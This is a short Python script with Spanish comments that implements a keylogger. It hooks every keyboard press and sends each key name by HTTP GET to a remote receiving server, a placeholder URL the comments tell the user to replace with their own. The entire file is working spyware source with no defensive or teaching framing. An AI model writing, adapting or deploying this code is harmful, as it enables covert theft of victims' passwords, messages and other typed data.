import keyboard
import requests
# Configuración del servidor
URL = "http://tu-servidor.com/receptor"  # Reemplaza con la URL de tu servidor
PARAMS = {}
# Función para enviar los datos al servidor
def enviar_datos(datos):
    PARAMS["datos"] = datos
    response = requests.get(url=URL, params=PARAMS)
    # Puedes agregar código adicional para manejar la respuesta del servidor si lo deseas
# Función para registrar las pulsaciones de teclado
def on_key_press(event):
    key = event.name
    enviar_datos(key)
# Registrar el evento de pulsación de teclado
keyboard.on_press(on_key_press)
# Mantener el programa en ejecución
keyboard.wait()